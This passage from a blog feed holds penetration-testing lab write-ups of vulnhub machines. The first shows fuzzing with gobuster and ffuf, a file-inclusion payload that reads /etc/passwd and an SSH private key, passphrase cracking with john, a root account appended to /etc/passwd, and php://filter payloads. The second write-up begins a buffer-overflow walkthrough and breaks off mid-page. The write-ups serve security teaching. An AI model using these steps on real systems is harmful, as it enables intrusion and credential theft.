class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" alt="image-20221108211601033" />  </li><li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" alt="image-20221108211801201"  /></li></ol><h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol><li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" alt="image-20221108212228720" /> <p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p><p>分别访问均没有获得有效信息。</p><p>ps：<a href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p></li><li><p>对 <code>/secret/</code> 做进一步路径爆破：</p><p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p><blockquote><p>安装：apt install gobuster</p><p>安装字典：apt install seclists</p><p>渗透测试要尝试掌握多种工具</p></blockquote><p>使用指定字典进行路径爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" alt="image-20221108213853527" />  <p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p></li></ol><h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p><ol><li><p>首先期望存在命令注入漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure><ul><li>选择字典文件 burp-parameter-names.txt 作为参数名；</li><li>命令 <code>ls</code> 作为参数值。</li></ul><p>进行爆破后，为获得有效结果，爆破失败。</p></li><li><p>期望存在文件包含漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure><ul><li>选择字典文件 burp-parameter-names.txt 作为参数名；</li><li>已知存在的主页文件的路径作为参数值。</li></ul><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" alt="image-20221108225352732" /> <p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p></li><li><p>查看靶机文件验证漏洞存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure><p>查看返回页面源码：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" alt="image-20221108225808433" width=300% /> <p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p></li></ol><h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol><li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" alt="image-20221109091744345" width=300% /><p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p></li><li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" alt="image-20221109092317615" width=300% /> <p>将其保存在文件 <code>id_rsa</code> 中。 </p></li><li><p>使用指定私钥登录靶机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure><p>发现需要输入私钥的密码：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" alt="image-20221109093513763" /> <p>考虑对其进行爆破。  </p><p>如果出现报错：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" alt="image-20221109093055156" /> <p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p><p>修改权限为7000即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p></li><li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure></li><li><p>使用 <code>john</code> 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p></blockquote><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" alt="image-20221109094836969" /> <p>成功获取私钥密码 <code>unicorn</code>。</p></li><li><p>成功登入靶机：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" alt="image-20221109095933335" /></li></ol><h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol><li><p>查看当前目录下的文件，获取第一个 Flag：</p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" alt="image-20221109100516303" /> <p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p></li><li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>find指令的使用：<a href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p><p>使用find命令按权限查找文件：<a href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p></blockquote><ul><li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p></li><li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p></li><li><p>-print：将输出结果写入标准输出文件；</p></li><li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p><p>忽略以上目录下的搜索结果；</p></li><li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p></li></ul><p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p><body style="text-align:left"><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" alt="image-20221109173321185" width=700/></body></li><li><p>进一步验证：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" alt="image-20221109173503185" width=700 /></body><p>发现我们确实具有写权限。</p><p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p></li></ol><h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol><li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure><p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" alt="image-20221109180626629"> </p></li><li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure></li><li><p>切换到用户 <code>test123</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure><p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"> </p><p>成功提权。</p></li><li><p>切换到 root 目录，发现第二个 Flag：</p><p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" alt="image-20221109181455730"> </p><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p></li></ol><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul><li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p></li><li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p></li><li><p><strong>root：</strong></p><p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"></p></li></ul><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li><li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li><li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li><li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li><li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li><li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li><li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li></ul><h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol><li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p></li><li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><ul><li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li></ul></li><li><p>通过 <a href="https://icyberchef.com/">icyberchef</a> 进行解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功获取到 <code>evil.php</code> 的源码。</p></li><li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-</span><br><span class="line">decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure></li><li><p>尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;网络攻防实战 第八次实验&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#x6b;&amp;#x65;&amp;#101;&amp;#107;&amp;#x6b;&amp;#101;&amp;#119;&amp;#121;&amp;#x40;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第七周 vulnhub-Fawkes</title>
    <link href="http://blog.kekwy.com/vulnhub-Fawkes/"/>
    <id>http://blog.kekwy.com/vulnhub-Fawkes/</id>
    <published>2022-11-02T05:21:10.000Z</published>
    <updated>2023-12-28T08:10:55.702Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>网络攻防实战 第七次实验</p><p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#109;">&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#109;</a></p><p>2022年11月2日</p><p>靶机连接：<a href="https://vulnhub.com/entry/harrypotter-fawkes,686/">https://vulnhub.com/entry/harrypotter-fawkes,686/</a></p></blockquote><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得三个 flag。</p><p>我们将使用到以下攻击手段：</p><ul><li>主机发现、端口扫描</li><li>FTP匿名登录</li><li>edb 调试程序</li><li>栈溢出攻击</li><li>tcpdump 流量分析</li><li>sudo 漏洞提权</li></ul><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote><p>kali: 10.0.2.15</p><p>靶机: 10.0.2.11</p></blockquote><h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol><li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.11</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p21,22,80,2222,9898 -sV 10.0.2.11 -A</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102090313959.png" alt="扫描其开放的端口以及个端口上对应的服务" width=620 /> </body> <p>发现两个比较特殊的端口：</p><p>21 - ftp 服务并允许<strong>匿名登录</strong>获取文件 <code>server_hogwarts</code>；</p><p>9898 - 一个自定义的服务。</p></li><li><p>访问80端口并查看网页源码，发现只有一张图片，并没有其他有价值的信息：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102090805885.png" alt="访问80端口" width=550/> </body><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102090827404.png alt="查看网页源码" width=600/></body></li></ol><h3 id="0x01-FTP-匿名登录"><a href="#0x01-FTP-匿名登录" class="headerlink" title="0x01. FTP 匿名登录"></a>0x01. FTP 匿名登录</h3><ol><li><p>查看我们端口扫描获取的信息：</p><body style="text-align:left"><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221102092253706.png" alt="端口扫描获取的信息" width=600/></body><p>说明该 FTP 服务可以使用用户名 <code>Anonymous</code> 无密码登入并可以查看文件 <code>server_hogwarts</code>。</p></li><li><p>通过 FTP 登入靶机并使用 get 指令下载上述文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ftp 10.0.2.11</span></span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">get server_hogwarts</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102095618149.png alt="使用 get 指令下载上述文件" width=650/></body></li><li><p>查看文件类型，发现是一个 ELF 可执行文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file server_hogwarts</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102101756229.png alt="查看文件类型" width=10000/></body></li><li><p>给予执行权限，尝试执行：</p><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102122247532.png alt="给予执行权限，尝试执行" width=430/></body><p>发现什么都没有输出，但是 shell 阻塞住了并没有退出，说明该程序确实启动了。</p></li><li><p>查看后台进程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -aux | grep server<span class="comment"># 显示名字包含server的所有进程</span></span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102122806419.png alt="查看后台进程" width=1000/></body><p>发现该程序确实创建了后台进程。</p></li><li><p>查看该进程的连接信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ss -pantu | grep server_hogwarts</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102123008647.png alt="查看该进程的连接信息" width=10000/></body><p>发现该进程运行在9898端口上，联想到靶机9898端口上的自定义服务，推测该程序即为靶机9898端口上所运行的服务。</p></li><li><p>使用 <code>nc</code> 命令监听该端口：</p><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102123424962.png alt="使用nc命令监听该端口" width=450/></body><p>发现我们可以进行输入，推测存在栈溢出攻击。</p></li></ol><h3 id="0x02-栈溢出攻击"><a href="#0x02-栈溢出攻击" class="headerlink" title="0x02. 栈溢出攻击"></a>0x02. 栈溢出攻击</h3><ol><li><p>使用 <code>checksec</code> 工具查看该文件开启了哪些保护机制：</p><blockquote><p>安装：$  apt install checksec</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file server_hogwarts</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102100412295.png alt="查看该文件开启了哪些保护机制" width=10000/></body><ul><li><code>STACK CANARY</code>：在初始化堆栈时在栈底插入一个随机生成的 cookie，在函数返回前调用 <code>__stack_chk_fail</code> 检查 cookie 有没有发生变化，若发生变化则不返回，而直接终止程序。由于缓冲区溢出攻击时往往会覆盖掉 cookie 的值，故该保护机制开启时会导致常规的溢出攻击失效，程序会直接终止而不是跳转至攻击者注入的目标地址。</li><li><code>NX</code>：开启时栈中数据没有执行权限，即攻击者不能通过缓冲区溢出注入攻击代码；</li><li><code>PIE</code>：编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定，使程序的内存布局难以预料。</li></ul><p>参考：<a href="https://blog.csdn.net/YangZiTrick/article/details/109595995">checksec</a></p><p><code>NX</code>、<code>PIE</code> 关闭，我们可以尝试注入反弹 shell 的代码并使其被执行，从而获取反弹 shell。</p><p><code>STACK CANARY</code> 被开启了，意味着注入时我们也许要针对其进行某种绕过，先不管它。</p></li><li><p>将 kali 本机上的 <strong>ALSR 安全机制</strong>关闭，该技术会导致地址空间随机化，不便于调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li><li><p>使用 <code>edb</code> 对当前程序进行调试，探测注入点：</p><blockquote><p>安装：$ apt install edb-debugger</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo edb</span></span><br></pre></td></tr></table></figure><p>点击 <code>File-&gt; Attach</code> ：</p><body style="text-align:left"><img src=https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102100412295.png alt="查看该文件开启了哪些保护机制" width=1000 /></body> <body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102131334120.png" alt="image-20221102131334120"  width=750 /> </body><p>选择目标进程：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102131449821.png" alt="image-20221102131449821"  width=700 /> </body><p> 点击运行：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102131645942.png" alt="image-20221102131645942"  width=750 /> </body><p> 使用 python 生成500个“A”，并在监听窗口进行输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;print(500*&#x27;A&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102132043611.png" alt="image-20221102132043611"  width=750 /> </body><p>触发报错且看到“0x41414141”，查看此时 EIP 寄存器的值：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102132228938.png" alt="image-20221102132228938" width=500 /> </body><p>发现变成了 <code>0x41414141</code>，而 ‘0x41’ 为 ‘A’ 的十六进制编码，说明我们输入的字符成功覆盖了函数返回地址，导致程序发生了错误跳转。</p><p><strong>“诶？不是说这个程序开启了 <code>STACK CANARY</code> 保护机制，会对栈溢出做检查吗？为什么直接注入就成了？”</strong></p><p>重新执行上述操作，并重新监听9898端口。点击单步调试：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102133244528.png" alt="image-20221102133244528"  width=750 /> </body><p>同样输入500个A， 回到 <code>edb</code> 继续追踪，直到触发错误，记录此时的指令地址：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102134114851.png" alt="image-20221102134114851"  width=750 />  </body><p> 发现在追踪的过程中没有调用 <code>__stack_chk_fail</code> 函数检查 cookie 的正确性。通过 <code>objdump</code> 查看其反汇编代码进一步确认，发现原来 <code>__stack_chk_fail</code> 只在一部分函数返回前被调用了，而在注入点所在的函数中未被调用，因此我们可以正常进行注入。</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102134746962.png" alt="image-20221102134746962"  width=750 /> </body><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102134658874.png" alt="image-20221102134658874"  width=750 /> </body><p>综上，<code>Canary found</code> 仅代表程序中存在检查机制，而不一定在所有的<code>ret</code> 语句前都做了检查。在进行渗透测试时应先尝试注入，不要被一些未验证的细节限制了思路。</p></li><li><p>使用 <code>msf-pattern</code> 工具进行溢出点在输入字符串中位置的探测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">msf-pattern_create -l 500<span class="comment"># 生成长度为500的模式字符串</span></span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102140948014.png" alt="image-20221102140948014"  width=10000 /> </body><p>重新程序并重新开始调试，将生成的模式字符串作为输入：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102141044293.png" alt="image-20221102141044293"  width=1000 /> </body><p>提示我们此时 EIP 中的值为 <code>0x64413764</code>，即我们输入的字符串中编码为“\x64\x41\x37\x64”的字串进入了 EIP 中。查找该段编码对应的字符串在模式字符串中的偏移量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">msf-pattern_offset -l 500 -q 64413764</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102143036638.png" alt="image-20221102143036638"  width=550 /> </body><p>也就是说从模式字符串中的第113个字符串开始造成了栈溢出。</p></li><li><p>使用 python 生成一段自定义字符串进行验证：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;print(112*&#x27;A&#x27; + &#x27;BBBB&#x27; + 100*&#x27;C&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure><p>将生成的字符串输入后，查看 EIP 和栈中的值：</p><body style="text-align:left"><img 